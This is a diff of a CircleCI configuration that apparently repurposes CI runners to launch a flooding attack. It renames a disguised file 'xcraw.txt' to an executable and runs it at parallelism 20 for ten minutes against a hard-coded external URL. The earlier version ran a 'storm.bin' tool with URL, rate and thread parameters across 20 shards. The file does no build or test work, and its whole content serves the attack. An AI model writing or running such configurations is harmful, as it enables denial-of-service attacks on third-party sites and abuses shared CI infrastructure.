@@ -1,52 +1,34 @@
-# .circleci/config.yml
 version: 2.1
-
-parameters:
-  url:
-    type: string
-    default: ""
-  rate:
-    type: integer
-    default: 0
-  time:
-    type: integer
-    default: 0
-  threads:
-    type: integer
-    default: 0
 
 jobs:
   ran:
-    docker:
-      - image: cimg/python:3.12
-    resource_class: medium
+    machine:
+      image: ubuntu-2204:current
     parallelism: 20
-    parameters:
-      shard:
-        type: integer
-        default: 1
     steps:
       - checkout
+
+      - run:
+          name: Setup Python
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y python3 python3-pip
+
+      - run:
+          name: Change name
+          command: mv xcraw.txt xcraw
+
       - run:
           name: Make raw executable
-          command: chmod +x storm.bin
+          command: chmod +x xcraw
+
       - run:
           name: Run raw with parameters
           command: |
-            TIME=<< pipeline.parameters.time >>
-            timeout $TIME ./storm.bin "<< pipeline.parameters.url >>" "$((TIME+60))" "<< pipeline.parameters.rate >>" "<< pipeline.parameters.threads >>" --raw
+            TIME=600
+            timeout $TIME ./xcraw "https://c1.dstatbot.win/WZYkf9QE" 600 2 1
 
 workflows:
   run-raw:
-    when:
-      and:
-        - equal: [ true, << pipeline.parameters.url >> ]
-        - equal: [ true, << pipeline.parameters.rate >> ]
-        - equal: [ true, << pipeline.parameters.time >> ]
-        - equal: [ true, << pipeline.parameters.threads >> ]
     jobs:
-      - ran:
-          name: ran-shard-<< matrix.shard >>
-          matrix:
-            parameters:
-              shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      - ran
